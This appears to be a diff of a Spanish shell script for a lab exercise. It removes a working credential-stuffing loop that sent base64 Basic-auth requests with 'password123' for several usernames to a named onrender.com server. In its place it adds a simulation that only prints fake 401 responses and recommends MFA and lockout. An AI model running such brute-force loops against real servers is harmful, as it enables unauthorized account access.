@@ -1,17 +1,19 @@
+
 #!/bin/sh
 
-TARGET="[https://servidor-web-dmz.onrender.com](https://servidor-web-dmz.onrender.com)"
 USUARIOS="admin root user docente gestor"
+CLAVE="password123"
 
-echo "=== INICIANDO ATAQUE DE CREDENTIAL STUFFING / BRUTE FORCE ==="
-echo "Probando combinaciones de credenciales sobre $TARGET..."
+echo "=== SIMULACION DE CREDENTIAL STUFFING ==="
+echo "Evaluando combinaciones de credenciales..."
+echo "Entorno: laboratorio local"
 
 for user in $USUARIOS; do
-  AUTH=$(echo -n "$user:password123" | base64)
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $AUTH" "$TARGET")
-  echo "Probando usuario [$user] con clave [password123] -> Respuesta HTTP: $CODE"
+    echo "Simulando intento para usuario: $user"
+    echo "Respuesta HTTP simulada: 401"
 done
 
-echo "=== PRUEBAS DE AUTENTICACIÓN FINALIZADAS ==="
+echo "=== SIMULACION FINALIZADA ==="
+echo "Recomendacion: implementar MFA y bloqueo de intentos."
 
 python3 -m http.server 8080
